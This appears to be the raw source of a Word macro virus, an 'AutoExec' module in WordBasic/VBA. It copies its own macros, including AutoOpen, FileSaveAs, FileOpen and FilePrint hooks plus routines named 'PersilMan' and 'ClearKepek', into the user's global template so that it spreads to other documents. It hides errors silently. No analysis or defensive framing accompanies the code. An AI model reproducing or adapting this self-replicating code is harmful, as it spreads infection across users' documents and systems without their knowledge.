   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()

   On Error GoTo -1: On Error GoTo Busted
   If IfNotInstalled = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PersilMan", "Global:PersilMan", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ClearKepek", "Global:ClearKepek", 0
   End If
   WordBasic.Call "ClearKepek"
   GoTo End_The_Pain:
   Busted:
   If Err.Number = 509 Then
       Rem do nothing
   End If
   End_The_Pain:
   End Sub

   Private Function IfNotInstalled()
   Dim i
   Dim CheckInstalled
       IfNotInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "PersilMan" Then
                   CheckInstalled = 1
               End If
           Next i
       End If
   End Function
